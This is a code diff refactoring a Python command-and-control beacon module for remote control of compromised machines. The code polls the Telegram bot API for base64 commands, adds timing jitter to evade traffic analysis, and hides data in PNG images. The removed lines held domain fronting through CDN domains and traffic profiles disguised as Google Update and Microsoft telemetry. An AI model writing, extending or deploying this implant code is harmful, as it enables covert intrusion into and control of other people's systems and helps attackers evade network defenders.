@@ -22,11 +22,16 @@ import threading
 import time
 import urllib.parse
 import urllib.request
-from dataclasses import dataclass, field
-from enum import Enum
 from typing import Any, Callable, Dict, List, Optional, Tuple
 
 # Optional: True Steganography Support
+try:
+    import io
+    import zlib
+    import requests
+except ImportError:
+    pass
+
 try:
     from PIL import Image
     PILLOW_AVAILABLE = True
@@ -36,324 +41,77 @@ except ImportError:
 logger = logging.getLogger(__name__)
 
 
-# =============================================================================
-# CONSTANTS
-# =============================================================================
+from dataclasses import dataclass, field
+from enum import Enum
 
+# =============================================================================
+# CONSTANTS & CONFIG
+# =============================================================================
 
 class C2Protocol(Enum):
-    """Supported C2 communication protocols"""
-
-    HTTP = "http"
     HTTPS = "https"
+    HTTP = "http"
     DNS = "dns"
-    TELEGRAM = "telegram"  # New 2026: Cloud API Abuse
-    STEGO = "stego"        # New 2026: Image Steganography
-    ICMP = "icmp"  # Future implementation
-    CUSTOM = "custom"
-
+    TELEGRAM = "telegram"
+    STEGO = "stego"
 
 class BeaconStatus(Enum):
-    """Beacon connection states"""
-
     DORMANT = "dormant"
-    ACTIVE = "active"
     CHECKING_IN = "checking_in"
-    EXECUTING = "executing"
+    ACTIVE = "active"
     ERROR = "error"
-
-
-# Default jitter range (percentage)
-DEFAULT_JITTER_MIN = 10
-DEFAULT_JITTER_MAX = 25
-
-# Default sleep interval (seconds)
-DEFAULT_SLEEP_INTERVAL = 60
-
-
-# =============================================================================
-# MALLEABLE C2 PROFILES
-# =============================================================================
-
-@dataclass
-class MalleableProfile:
-    """configuration for traffic obfuscation"""
-    name: str
-    user_agents: List[str]
-    headers: Dict[str, str]
-    urls: List[str]
-    jitter_range: Tuple[int, int]
-
-
-PROFILES = {
-    "default": MalleableProfile(
-        name="default",
-        user_agents=["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"],
-        headers={"Accept": "*/*"},
-        urls=["/api/status", "/api/check", "/v1/health"],
-        jitter_range=(10, 20)
-    ),
-    "google_update": MalleableProfile(
-        name="google_update",
-        user_agents=[
-            "GoogleUpdate/1.3.33.5",
-            "GoogleUpdate/1.3.35.331",
-        ],
-        headers={
-            "X-Goog-Update-AppId": "{8A69D345-D564-463c-AFF1-A69D9E530F96}",
-            "X-Goog-Update-Interactivity": "fg",
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        urls=["/service/update2", "/win/v2/check"],
-        jitter_range=(15, 30)
-    ),
-    "microsoft_telemetry": MalleableProfile(
-        name="microsoft_telemetry",
-        user_agents=["Microsoft-Windows/10.0.19041"],
-        headers={
-            "X-MS-Tele-Type": "diagnostic",
-            "ContentType": "application/bond-compact-binary"
-        },
-        urls=["/v2.0/one/collector", "/settings/v3/config"],
-        jitter_range=(20, 45)
-    ),
-    "amazon_cloudfront": MalleableProfile(
-        name="amazon_cloudfront",
-        user_agents=["Amazon CloudFront"],
-        headers={
-            "X-Amz-Cf-Id": "3389-443-80-8080",
-            "Via": "2.0 4c5f9.cloudfront.net (CloudFront)"
-        },
-        urls=["/pixel.gif", "/f4.png"],
-        jitter_range=(5, 15)
-    )
-}
-
-
-
-# =============================================================================
-# DATA CLASSES
-# =============================================================================
-
 
 @dataclass
 class C2Config:
-    """Configuration for C2 channel"""
-
-    protocol: C2Protocol = C2Protocol.HTTPS
-    primary_host: str = "127.0.0.1"
+    protocol: C2Protocol
+    primary_host: str = "localhost"
     primary_port: int = 443
-    fallback_hosts: List[str] = field(default_factory=list)
-    sleep_interval: int = DEFAULT_SLEEP_INTERVAL
-    jitter_min: int = DEFAULT_JITTER_MIN
-    jitter_max: int = DEFAULT_JITTER_MAX
-    encryption_key: Optional[bytes] = None
-    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-
-    # Malleable C2
-    profile_name: str = "default"  # 'google_update', 'microsoft_telemetry', etc.
-
-    # Telegram C2
-    telegram_token: Optional[str] = None
-    telegram_chat_id: Optional[str] = None
-
-    # Domain fronting
+    sleep_interval: int = 60
+    jitter_min: int = 10
+    jitter_max: int = 30
     fronting_domain: Optional[str] = None
     actual_host: Optional[str] = None
-
-    # DNS tunneling
     dns_domain: Optional[str] = None
-    dns_subdomain_length: int = 32
-
-    # SSL/TLS Security
-    verify_ssl: bool = True
-
+    dns_subdomain_length: int = 16
+    telegram_token: Optional[str] = None
+    telegram_chat_id: Optional[str] = None
+    encryption_key: Optional[bytes] = None
+    profile_name: str = "default"
 
 @dataclass
 class BeaconMessage:
-    """Message structure for beacon communication"""
-
     message_id: str
     command: str
-    data: Dict[str, Any] = field(default_factory=dict)
+    data: Optional[Dict[str, Any]] = None
     timestamp: float = field(default_factory=time.time)
-    encrypted: bool = False
-
 
 @dataclass
 class BeaconResponse:
-    """Response from C2 server"""
-
     success: bool
     message_id: str
     command: Optional[str] = None
     data: Optional[Dict[str, Any]] = None
-    error: Optional[str] = None
-
-
-# =============================================================================
-# JITTER ENGINE
-# =============================================================================
-
 
 class JitterEngine:
-    """
-    Implements timing jitter to evade traffic analysis.
-
-    Jitter randomizes the time between beacon check-ins to avoid
-    creating detectable patterns in network traffic.
-    """
-
-    def __init__(
-        self,
-        base_interval: int = DEFAULT_SLEEP_INTERVAL,
-        jitter_min: int = DEFAULT_JITTER_MIN,
-        jitter_max: int = DEFAULT_JITTER_MAX,
-    ):
-        """
-        Initialize jitter engine.
-
-        Args:
-            base_interval: Base sleep interval in seconds
-            jitter_min: Minimum jitter percentage (0-100)
-            jitter_max: Maximum jitter percentage (0-100)
-        """
+    def __init__(self, base_interval: int, min_jitter: int, max_jitter: int):
         self.base_interval = base_interval
-        self.jitter_min = max(0, min(100, jitter_min))
-        self.jitter_max = max(self.jitter_min, min(100, jitter_max))
-
+        self.jitter_min = min_jitter
+        self.jitter_max = max_jitter
+    
     def get_sleep_time(self) -> float:
-        """
-        Calculate next sleep time with jitter applied.
+        jitter_percent = random.uniform(self.jitter_min, self.jitter_max) / 100.0
+        factor = 1.0 + (random.choice([-1, 1]) * jitter_percent)
+        return max(0, self.base_interval * factor)
+    
+    def update_interval(self, new: int):
+        self.base_interval = new
 
-        Returns:
-            Sleep time in seconds with random jitter
-        """
-        jitter_percent = random.uniform(self.jitter_min, self.jitter_max)
-        jitter_factor = jitter_percent / 100.0
-
-        # Apply jitter: base ± (base * jitter_factor)
-        variation = self.base_interval * jitter_factor
-
-        # Randomly add or subtract
-        if random.choice([True, False]):
-            sleep_time = self.base_interval + variation
-        else:
-            sleep_time = self.base_interval - variation
-
-        # Ensure minimum sleep time of 1 second
-        return max(1.0, sleep_time)
-
-    def update_interval(self, new_interval: int) -> None:
-        """Update base interval from server command"""
-        self.base_interval = max(1, new_interval)
-        logger.debug(f"Updated sleep interval to {self.base_interval}s")
-
-
-# =============================================================================
-# DOMAIN FRONTING
-# =============================================================================
-
-
-class DomainFronter:
-    """
-    Implements Domain Fronting technique for HTTPS C2.
-
-    Domain Fronting uses legitimate CDN domains (e.g., cloudfront.net)
-    as the SNI, while the actual Host header points to our C2 server.
-    This makes traffic appear to go to legitimate services.
-
-    Architecture:
-        Client --> CDN (cloudfront.net) --> C2 Server (hidden)
-
-        TLS SNI: legitimate-cdn.cloudfront.net
-        HTTP Host: our-c2-server.cloudfront.net
-    """
-
-    # Common CDN domains that can be used for fronting
-    FRONTABLE_DOMAINS = [
-        # These are examples - actual frontable domains may vary
-        "cloudfront.net",
-        "azureedge.net",
-        "fastly.net",
-        "cloudflare.com",
-    ]
-
-    def __init__(
-        self,
-        fronting_domain: str,
-        actual_host: str,
-        port: int = 443,
-        profile: MalleableProfile = PROFILES["default"],
-        verify_ssl: bool = True,
-    ):
-        """
-        Initialize domain fronter.
-
-        Args:
-            fronting_domain: Public-facing CDN domain (used in SNI)
-            actual_host: Actual Host header (our C2 server)
-            port: HTTPS port
-            profile: Malleable C2 profile
-            verify_ssl: Whether to verify SSL certificates
-        """
-        self.fronting_domain = fronting_domain
-        self.actual_host = actual_host
-        self.port = port
-        self.profile = profile
-        self.verify_ssl = verify_ssl
-
-        logger.info(f"Domain fronter initialized: {fronting_domain} -> {actual_host} (Profile: {profile.name})")
-
-    def create_request(
-        self,
-        endpoint: str = "/",
-        method: str = "GET",
-        data: Optional[bytes] = None,
-        headers: Optional[Dict[str, str]] = None,
-    ) -> urllib.request.Request:
-        """
-        Create HTTP request with domain fronting headers.
-
-        Args:
-            endpoint: URL endpoint path
-            method: HTTP method
-            data: Request body data
-            headers: Additional headers
-
-        Returns:
-            Request object configured for domain fronting
-        """
-        # 1. Obfuscate URL based on profile
-        if endpoint == "/" or endpoint == "/api/beacon":
-            # Pick a random URL from profile to look like legit traffic
-            endpoint = random.choice(self.profile.urls)
-
-        url = f"https://{self.fronting_domain}:{self.port}{endpoint}"
-
-        # 2. Build Headers from Profile
-        request_headers = {
-            "Host": self.actual_host,  # Key for Fronting
-            "User-Agent": random.choice(self.profile.user_agents),
-            "Connection": "keep-alive",
-        }
-
-        # Add profile specific headers
-        request_headers.update(self.profile.headers)
-
-        if headers:
-            request_headers.update(headers)
-
-        request = urllib.request.Request(
-            url, data=data, headers=request_headers, method=method
-        )
-
-        return request
-
-
-# =============================================================================
-# TELEGRAM C2 CHANNEL (Cloud API Abuse)
-# =============================================================================
+PROFILES = {
+    "default": {
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "headers": {"Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"}
+    }
+}
 
 class TelegramC2:
     """
@@ -370,9 +128,7 @@ class TelegramC2:
     def _request(self, method: str, params: dict = None) -> dict:
         try:
             url = f"{self.base_url}/{method}"
-            # Use standard urllib to avoid extra deps if possible, but requests is cleaner
             # Re-using aiohttp or requests if available
-            import requests # Lazy import
             resp = requests.post(url, data=params, timeout=10)
             return resp.json()
         except Exception as e:
@@ -389,10 +145,12 @@ class TelegramC2:
     def poll_commands(self) -> Optional[bytes]:
         """Long poll for commands"""
         updates = self._request("getUpdates", {"offset": self.offset, "timeout": 5})
-        if notUpdates := updates.get("result"):
+        
+        not_updates = updates.get("result")
+        if not not_updates:
             return None
 
-        last_update = notUpdates[-1]
+        last_update = not_updates[-1]
         self.offset = last_update["update_id"] + 1
 
         text = last_update.get("message", {}).get("text", "")
@@ -401,7 +159,8 @@ class TelegramC2:
             try:
                 b64_cmd = text.split("CMD:")[1].strip()
                 return base64.b64decode(b64_cmd)
-            except: pass
+            except Exception:
+                pass
         return None
 
 
@@ -438,7 +197,6 @@ class StegoTransport:
             chunk_len = len(data).to_bytes(4, "big")
 
             # Simple CRC32
-            import zlib
             crc = zlib.crc32(chunk_type + data).to_bytes(4, "big")
 
             new_chunk = chunk_len + chunk_type + data + crc
@@ -453,10 +211,10 @@ class StegoTransport:
             try:
                 # We need to save bytes to temp file for PIL to read potentially
                 # Or use io.BytesIO
-                import io
                 img = Image.open(io.BytesIO(png_bytes))
                 data = StegoTransport._extract_lsb(img)
-                if data: return data
+                if data:
+                    return data
             except Exception as e:
                 logger.debug(f"LSB extraction failed (trying chunk): {e}")
 
